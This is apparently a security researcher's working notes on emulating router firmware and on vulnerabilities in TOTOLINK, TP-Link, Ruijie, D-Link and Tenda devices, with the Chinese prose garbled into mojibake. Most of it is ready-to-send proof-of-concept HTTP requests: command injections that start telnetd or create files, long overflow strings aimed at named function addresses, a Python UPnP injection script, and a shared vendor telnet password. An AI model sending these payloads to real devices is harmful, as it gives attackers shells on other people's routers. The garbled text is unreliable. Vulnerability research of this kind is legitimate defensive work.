- å‘ç°æ— æ³•ç™»é™†, ä»€ä¹ˆå¯†ç éƒ½ä¸è¡Œ. äºæ˜¯æ‰¾åˆ°ç™»é™†å‡½æ•°`authSecurityHandler`****patchè·³è¿‡å¯†ç strcmp.
- å•å‘ç°ç½‘é¡µå¡ä½äº†æ— æ³•æ˜¾ç¤ºè®¾ç½®çš„é€‰é¡¹å’ŒæŒ‰é’®,å®‰è£…gdb-multiarchè°ƒè¯•äº†ä¸‹. åœ¨ç½‘é¡µå¡ä½æ—¶ctrl+cä¸­æ–­ååˆç»§ç»­è¿è¡Œ, å°±ä¸å¡äº†, è¿˜æ˜¾ç¤º`ucloud_p_sem: syscall interrupt`, **patchäº†ucloud_p_semå‡½æ•°.**
- æŸäº›pocå°±æ˜¯åœ¨ä¹±å†™, å‘ç°åœ¨`parseFirstLine`å‡½æ•°ä¸­æœ‰URI too bigçš„2048é•¿åº¦é™åˆ¶, æŠŠä¸€äº›æ ˆæº¢å‡ºçš„é•¿åº¦æ”¹åœ¨è¿™ä¸ªé™åˆ¶ä¹‹å†…å³å¯éªŒè¯. 



## totolink A7000R\NR1800X\X5000R

é€šè¿‡github Actionç¯å¢ƒçš„docker+qemu-systemç³»ç»Ÿæ¨¡å¼æ­å»ºï¼š

1.dockerä¸­å®‰è£…qemu-system-mipselï¼Œéœ€è¦æå‰å°†å›ºä»¶æ–‡ä»¶ç³»ç»Ÿä¸Šä¼ åˆ°qemuå¯åŠ¨çš„é•œåƒæ–‡ä»¶ä¸­(æœ¬åœ°ä½¿ç”¨tapèµ·qemuå°†æ–‡ä»¶ç³»ç»Ÿscpè¿‡å»ï¼Œæˆ–è€…åˆ«çš„æ–¹å¼ä¹Ÿå¯ä»¥)

2.ç¼–å†™shè„šæœ¬å®ç°qemu-system-mipselè‡ªåŠ¨ç™»å½•

3.dockerfileç¼–å†™å®‰è£…éœ€è¦çš„ä¾èµ–

shè„šæœ¬(åˆ«çš„ç³»ç»Ÿéœ€è¦ä¿®æ”¹ä¸ºå¯¹åº”ç³»ç»Ÿå)

```Bash
cd /root/
/usr/bin/expect<<EOF
set timeout 10000

spawn qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic \
    -net user,hostfwd=tcp::80-:80 -nographic

expect "debian-mipsel login:"
send "root\r"

#expect "root@debian-mipsel:~# "
#send "echo 0 > /proc/sys/kernel/randomize_va_space\r"

expect "Password:"
send "root\r"

expect "root@debian-mipsel:~# "
send "mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc\r"

expect "root@debian-mipsel:~# "
send "chroot squashfs-root/ /bin/sh\r"

expect "# "
send "ifconfig\r"

expect "# "
send "./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf\r"
expect "# "

expect eof
EOF
#cd /root/squashfs-root
#./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
sleep infinity;
```

Dockerfile

```Bash
FROM ubuntu:16.04

RUN apt update \
    && apt install -y qemu-system-mipsel \
    && apt install -y xz-utils \
    && apt install -y net-tools \
    && apt install -y expect \
    && apt install -y bridge-utils uml-utilities openssh-server

COPY debian_wheezy_mipsel_standard.qcow2 /root/debian_wheezy_mipsel_standard.qcow2

COPY vmlinux-3.2.0-4-4kc-malta /root/vmlinux-3.2.0-4-4kc-malta

COPY start.sh /root/start.sh

CMD [ "/bin/sh", "-c", "/root/start.sh" ]
```

æ„å»ºå¥½dockeråï¼Œå°±å¯ä»¥å°†å®¹å™¨ä¸Šä¼ åˆ°è‡ªå·±çš„githubä»“åº“

ç„¶åexploit_dbä¸­ä½¿ç”¨çš„dockerfileå¯ä»¥ç›´æ¥è¿™æ ·

```Bash
FROM xxx/xxx:version
```

è¿™æ ·å°±èƒ½è§£å†³github actionä¸­è·‘dockerï¼ŒåŒæ—¶ï¼Œdockerä¸Šè¿è¡Œqemu-systemçš„å„ç§é—®é¢˜



## tplink ER5120G

CVE-2023-43138	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868nå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨è®¤è¯åæ·»åŠ NAPTè§„åˆ™ï¼Œä¸”è§„åˆ™åç§°å¸¦æœ‰æ³¨å…¥ç‚¹ã€‚
CVE-2023-43137	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868nå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨è®¤è¯åæ·»åŠ ACLè§„åˆ™ï¼Œè§„åˆ™åç§°å‚æ•°å­˜åœ¨æ³¨å…¥ç‚¹ã€‚

CVE-2023-43135    TP-LINK ER5120G 4.0 2.0.0 Build 210817 Rel.80868nä¸­å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯è·å–è®¾å¤‡æ•æ„Ÿä¿¡æ¯ï¼Œè·å–ç”¨æˆ·ä»¤ç‰Œï¼Œæœ€ç»ˆç™»å½•è®¾å¤‡åå°ç®¡ç†ã€‚





## dlink 900WO



## tplink IP43AN









## ruijie WS6008_WS6108



/tmp/html/web/routers/common/system/file.lua   downFiles

sbin/auto_route/routelib.lua  routelib.get_pub_network_intf_and_sip



```shell
cd '/data/sourcedir'
rm -f '/tmp/vsd/0/destination.tar'
tar -cf '/tmp/vsd/0/destination.tar' 'file1.txt' 'file2.txt'
sync
```



```http
POST /web/init.lua/common.system.file/downFiles HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 44
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; SIDS=F1734C792A0F5152FF2BC70F48738AA1; login=1; mac=0074.9c0c.797b; oid=1.3.6.1.4.1.4881.1.3.1.1.115; hotback_num=128; MODE_LOCAL=0; main_ui_cookie=menu_file_manage
Host: 192.168.1.2
Origin: https://192.168.1.2
Referer: https://192.168.1.2/common/file/file-admin.htm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Connection: close


params=%7B%22src%22%3A%22%2Fdata%22%2C%22dst%22%3A%221.tar%22%2C%22list%22%3A%5B%221%27%3Btelnetd%27%22%5D%7D
```



## datacon

https://xz.aliyun.com/t/5808#toc-0





uhttpd : 0x8052612/0x8051BF2

```
ustream_printf(cl_0->us, "Location: %s\r\n\r\n", string_1);
ustream_printf(cl_0->us, "%s: %s\r\n", v4, string_0);
```

odhcpd: 0x4AAB 

```
v10 = strcpy(addr4.s_addr, name)
```

0x5DBB

```
v96 = malloc(v95 + 1);
```

0x5F69

```c
v105 = realloc(*(v7 + 584), 4 * v104);
```







## dlink dir-850L

#### bug1

```http
POST /pigwidgeon.cgi HTTP/1.0

Host: shareport.local

Cookie: uid=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Prefix: asasdaw

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 21
```



#### bug2

```http
GET /scandir.sgi?action=umnt&en=;telnetd -&path=aaa&where=bbb HTTP/1.0

Host: shareport.local

Cookie: uid=unUFIr9ia

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```



#### bug3

```http
POST /captcha.cgi HTTP/1.1

Host: 192.168.0.1

Cookie: uid=xrU7UqR6kP

Content-Length: 9

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Platform: "Linux"

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Content-Type: application/x-www-form-urlencoded

Accept: */*

Origin: https://192.168.0.1

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.0.1/info/Login.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



DUMMY=YES
```

#### bug4

```HTTP
POST /fwupload.cgi HTTP/1.1

Host: shareport.local

Cookie: uid=qxPQB9fty

Content-Length: 9961750

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: https://shareport.local

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOtYaEb8JA6svPVR2

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://shareport.local/UpdateFirmware.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



------WebKitFormBoundaryOtYaEb8JA6svPVR2

Content-Disposition: form-data; name="select_Folder_a"; filename="EW_3.0(1)B11P226_EW1200G_10211312_install_encypto.bin"

Content-Type: application/octet-stream



upgrade_crypt_v1!@2021ÃqÃ£Â«Ã­Ã¯Ã«|~Ã?U6Â¢Ã¾oÃ¾oÂ Âº.zz}|26/,_0(
_3
------WebKitFormBoundaryOtYaEb8JA6svPVR2--


```

#### bug5

```python
import socket
from time import sleep


def exp(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.2/>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-infinite Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)

exp('192.168.0.1', 49152, '`touch /flag4`')
```



## dlink Dir-842

`socket(2, 2, 0)` è°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªIPv4(AF_INETï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯2)çš„æµå¼å¥—æ¥å­—(SOCK_STREAMï¼Œå› ä¸ºç¬¬äºŒä¸ªå‚æ•°æ˜¯2)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šçš„æ˜¯ä½¿ç”¨é»˜è®¤çš„åè®®(é€šå¸¸æ˜¯TCP)ã€‚

` 0x7F000001` è¡¨ç¤ºä½¿ç”¨å›ç¯åœ°å€(127.0.0.1)

load_all_modules



## dlink dir-821 ca

å›ºä»¶åŠ å¯†



## tenda AX12

### bug1

0x42F69C

/goform/setMacFilterCfg



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231121191829134.png" alt="image-20231121191829134" style="zoom:50%;" />

**poc**

```http
POST /goform/setMacFilterCfg HTTP/1.1
Host: 192.168.11.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: http://192.168.11.1
Connection: close
Referer: http://192.168.11.1/iptv.html?random=0.7642888131213508&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmho1qw


macFilterType=black&deviceList=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\r

```



### bug2 

0x43AF3C

goform/SetVirtualServerCfg



### bug3

0x43B3C4

goform/SetStaticRouteCfg



### bug4

0x43FDCC

goform/SetNetControlList





## tenda AX2

tendaé€šç”¨telnetå¯†ç Fireitup
https://www.anquanke.com/post/id/283630#h3-2
AX12çœŸæœºåˆ†æ



## tenda AX9

bug1

0x42F69C

bug2

0x43AF3C

bug3

0x43B3C4

bug4

0x43FDCC



bug5

0x42C808



setModules/setDeviceInfo

![image-20231122140708612](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231122140708612.png)



bug6

0x430304 

goform/SetOnlineDevName



bug7

0x43FBBC

goform/SetNetControlList



bug8

0x43FA38

goform/SetNetControlList


è¿™ä¸ªè·¯ç”±å™¨ä¸»è¦è¯»å–é…ç½®æ–‡ä»¶å®Œæˆç½‘ç»œæœåŠ¡é…ç½®ï¼Œå¯ä»¥å†™åœ¨æ–‡ä»¶ç³»ç»Ÿé‡Œ

/etc/config/network
```c
config interface 'lookback'
        option ifname 'lo'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.0.0.1'
 
config globals 'globals'
 
config interface 'lan'
        option type 'bridge'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.255.255.0'
```

å‚è€ƒæ–‡ç« ï¼š
[Tenda Ax12 è®¾å¤‡åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°](https://www.anquanke.com/post/id/283630#h3-9)

## tenda AX3
armæ¶æ„ï¼Œè¿™ä¸ªå›ºä»¶è§£å‹åå¸¦æœ‰ç¬¦å·è¡¨ï¼ŒåŸºäºgoheadï¼Œetc->etc_ro webroot->webroot_roé‚£ä¸€å¥—ä¸œè¥¿

```shell
sudo cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static ./bin/httpd
```

å¯åŠ¨åå‘ç°å¡ä½ï¼Œå’Œw20eä¸€æ ·çš„æƒ…å†µï¼Œç”±äºæ²¡æœ‰æŠ¥é”™å¤§æ¦‚ç‡æ˜¯è¿›å¾ªç¯äº†

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231124193644.png)

æ”¹åˆ¤æ–­


ç„¶åæ‰¾ä¸åˆ°å˜é‡å€¼ï¼Œæ˜¯å› ä¸ºç¼ºå°‘è·å–å€¼çš„å‡½æ•°ï¼Œéœ€è¦hookä¸€ä¸‹ï¼Œhookæ–¹å¼åŒw20e
åŠ«æŒsetvalueå‡½æ•°ï¼Œç¼–è¯‘å¾—åˆ°å¦‚ä¸‹hook.so
![[hook.so]]

```shell
sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./hook.so ./bin/httpd
```

ç„¶åä¿®å¤ä¸€ä¸‹è½¯è¿æ¥ï¼Œå»etc/default.cfgé‡Œæ”¹ipï¼Œå°±èƒ½è®¿é—®äº†ï¼Œä½†æ˜¯ç™»å½•ä¸äº†ï¼Œåº”è¯¥è¦patchä¸€ä¸‹

## tenda i29
https://www.tendacn.com/download/detail-4574.html
https://www.tendacn.com/products/ceiling-ap.html

./usr/sbin/httpd --home /www --log stdout:2


/common/lang/w63ap/cn/translate.json?116748?0.31929846819422736 HTTP/1.1

```http
POST /goform/modules?0.021745560222136584 HTTP/1.1
Host: 192.168.3.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.3.2
Connection: close
Referer: http://192.168.3.2/login.html

{"sysLogin":{"username":"admin","password":"YWRtaW4=","logoff":false,"timeZone":9,"time":"2023;12;4;16;13;1"}}
```




```http
POST /goform/modules?0.021745560222136584 HTTP/1.1

Host: 192.168.3.2

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0

Accept: application/json

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Content-Type: application/json

X-Requested-With: XMLHttpRequest

Content-Length: 119

Origin: http://192.168.3.2

Connection: close

Referer: http://192.168.3.2/login.html

Cookie: _:USERNAME:_=admin



{"sysScheduleRebootSet":{"rebootEn":"1","rebootType":"timing","rebootTime":"08:00","rebootDate":"7;\"$(telnetd) \""

}}
```




bug1 +
0x414ECC

```http
POST /goform/modules?0.7791553911913489 HTTP/1.1
Host: 192.168.0.254
Content-Length: 3235
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysLogin":{"username":"admin","password":"YWRtaW4=","logoff":false,"timeZone":9,"time":"2023;12;10;0;32;3411111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"}}
```


bug2-3
0x418C9C
```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 309
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysScheduleRebootSet":{"rebootEn":true,"rebootType":"timing","rebootDate":"1","rebootTime":"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111:00"}}
```





```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 114
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysScheduleRebootSet":{"rebootEn":true,"rebootType":"timing","rebootDate":"$(touch /flag)","rebootTime":"3:00"}}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231210002823.png)


bug4
0x419D9C
```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 333
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysTimeInfoSet":{"time":"2023-12-10-0-41-48111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","timeInterval":"7200","type":"net","timeZone":"38"}}
```

bug5
41C288
```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 214
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"lanCfgSet":{"lanMac":"08:40:F3:D1:25:90","lanType":"static","lanIp":"192.168.0.254","lanMask":"255.255.255.0","lanGw":"0.0.0.01111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","preDns":"0.0.0.0","altDns":"0.0.0.0","deviceName":"Access Point","ethMode":"auto"}}
```



bug6
41DA20
```http
POST /goform/modules?0.2672032995215783 HTTP/1.1
Host: 192.168.0.254
Content-Length: 68
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"pingSet":{"pingIp":"0.0.0.0111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","pingNum":"4","pingSize":"64"}}
```

bug7
422774

```HTTP
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 1692
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"wifiRadioSetIndoor":{"wifiEn":true,"countryCode":"CN","netMode":"anacax","channel":"0","bandwidth":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","currentPower":"29","radio":"5G"}}
```



bug8
4274B4

```HTTP
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 620
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
